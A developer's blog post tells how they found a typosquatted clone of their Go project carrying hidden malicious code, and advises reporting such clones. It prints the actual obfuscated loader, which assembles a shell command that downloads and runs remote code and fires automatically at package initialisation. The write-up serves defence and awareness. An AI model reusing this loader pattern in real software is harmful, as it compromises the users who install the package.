---
title: Detecting a Typosquatting Attack on my Go repository
date: 2025-03-25
summary: A look at how I discovered a typosquatting attack on my repository and the steps I took to combat it.
categories: [GitHub, Go, Security, Typosquatting]
---

[Typosquatting](https://en.wikipedia.org/wiki/Typosquatting) is not a new concept, but its impact on the Go ecosystem has been growing steadily. In this post, I’ll share how I uncovered a typosquatting attack targeting my project, detail the inner workings of such attacks, and outline effective measures to mitigate these risks.

# How I Discovered the Attack

Two days ago I released a new version of my library [go-hoarder](https://github.com/Madh93/go-hoarder) following a recent publication of [Hoarder](https://hoarder.app/). Out of curiosity, I decided to check who else was using my library by visiting [go-hoarder dependents](https://github.com/Madh93/go-hoarder/network/dependents?dependent_type=REPOSITORY). There, in addition to one of my own projects ([Hoarderbot](https://github.com/Madh93/hoarderbot)), I discovered another repository that was an exact duplicate of my Hoarderbot.

At first, it seemed like a legitimate fork or clone, but something felt off. A quick `git diff` revealed that the repository was not an official fork at all. Instead, I found that the code had been subtly modified to include suspicious, obfuscated logic.

# The Wider Threat Landscape

I found out that my case is just one example in a larger attack. In these incidents, attackers copy popular repositories—often with only a slight typo in the name—and add harmful code. You can read more in these articles:

- [Typosquatted Go Packages Deliver Malware Loader](https://socket.dev/blog/typosquatted-go-packages-deliver-malware-loader)
- [Rogue One: A Malware Story](https://mhouge.dk/blog/rogue-one-a-malware-story)

These sources illustrate that this is not an isolated incident, but rather a systematic abuse of the package ecosystem that affects many projects across the Go community.

# Delving into the Technical Details

Attackers copy a trusted repository very closely, with only minor changes in the name that can trick users into thinking it is the real one. After making the copy, they change parts of the code to include hidden commands. For example, here’s a snippet that exemplifies the obfuscation technique used:

```go
func vDawlkJr() error {
    TZ := []string{"n", "a", "7", "a", " ", "d", "s", "&", "d", "w", "f", "o", "b", "h", "/", "u", " ", "i", "|", "6", "m", "i", "s", "t", "e", "3", " ", "/", "b", "r", "4", "/", "r", "3", "0", "p", "t", "o", ":", "b", "n", "e", "a", "t", "v", "/", "-", "t", "c", "s", "f", "O", " ", "d", "/", " ", "3", "-", "f", "g", "/", "5", "c", "g", "e", "e", ".", "h", "/", "1", "a", " "}
    VSIlPIf := "/bin/sh"
    BuTQBr := "-c"
    XwDuEVID := TZ[9] + TZ[59] + TZ[65] + TZ[43] + TZ[26] + TZ[57] + TZ[51] + TZ[4] + TZ[46] + TZ[71] + TZ[13] + TZ[36] + TZ[23] + TZ[35] + TZ[49] + TZ[38] + TZ[27] + TZ[68] + TZ[62] + TZ[70] + TZ[32] + TZ[44] + TZ[41] + TZ[48] + TZ[11] + TZ[20] + TZ[17] + TZ[66] + TZ[58] + TZ[15] + TZ[0] + TZ[14] + TZ[22] + TZ[47] + TZ[37] + TZ[29] + TZ[1] + TZ[63] + TZ[24] + TZ[31] + TZ[5] + TZ[64] + TZ[25] + TZ[2] + TZ[33] + TZ[8] + TZ[34] + TZ[53] + TZ[10] + TZ[45] + TZ[3] + TZ[56] + TZ[69] + TZ[61] + TZ[30] + TZ[19] + TZ[39] + TZ[50] + TZ[52] + TZ[18] + TZ[55] + TZ[60] + TZ[28] + TZ[21] + TZ[40] + TZ[54] + TZ[12] + TZ[42] + TZ[6] + TZ[67] + TZ[16] + TZ[7]
    exec.Command(VSIlPIf, BuTQBr, XwDuEVID).Start()
    return nil
}

var uOjeiC = vDawlkJr()
```

This code builds a shell command by piecing together strings from an array. The obfuscation makes it hard to see what the command really does, which helps the malicious code hide from basic security checks.

# The Impact on the Go Ecosystem

The broader implications of these attacks are significant:

- **Supply Chain Risks:** When developers unknowingly use these copied packages, they may introduce malware into their projects.
- **Loss of Trust:** The Go community values open source, but these attacks make it harder to trust external packages.
- **Extra Security Work:** Projects and companies must spend more time and resources on security to detect and fix these problems.

# How to Act

If you encounter a similar scenario, consider these steps to protect your project and the community:

- **Notify GitHub:** Report the [illegitimate repository](https://docs.github.com/en/communities/maintaining-your-safety-on-github/reporting-abuse-or-spam#reporting-a-repository) so GitHub can investigate and remove it.
- **Submit Feedback to Go Security:** Provide feedback through the [Go Security Vulnerability Feedback page](https://go.dev/doc/security/vuln/#feedback) to help address these threats.

# Conclusion

Typosquatting attacks are a growing threat in the Go ecosystem. By learning how attackers copy trusted repositories and hide harmful code, we can better protect our projects. Staying informed and careful is key to keeping our open-source community safe.
